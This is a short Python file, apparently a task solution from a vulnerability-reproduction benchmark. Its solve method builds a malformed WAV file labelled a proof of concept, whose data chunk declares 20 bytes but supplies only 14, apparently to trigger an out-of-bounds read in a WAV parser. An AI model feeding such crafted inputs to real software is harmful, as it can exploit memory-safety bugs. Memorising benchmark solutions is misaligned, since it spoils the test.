import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        channels = 1
        sample_rate = 8000
        bits_per_sample = 8
        byte_rate = sample_rate * channels * bits_per_sample // 8
        block_align = channels * bits_per_sample // 8

        fmt_chunk = b'fmt ' + struct.pack('<IHHIIHH',
                                          16,         # Subchunk1Size (PCM)
                                          1,          # AudioFormat (PCM)
                                          channels,   # NumChannels
                                          sample_rate,# SampleRate
                                          byte_rate,  # ByteRate
                                          block_align,# BlockAlign
                                          bits_per_sample)  # BitsPerSample

        data_payload = b'\x00' * 14  # Actual data smaller than declared size
        data_chunk = b'data' + struct.pack('<I', 20) + data_payload  # Declare 20 bytes, provide 14

        riff_size = 4 + len(fmt_chunk) + len(data_chunk)  # 'WAVE' + chunks
        header = b'RIFF' + struct.pack('<I', riff_size) + b'WAVE'

        poc = header + fmt_chunk + data_chunk
        return poc
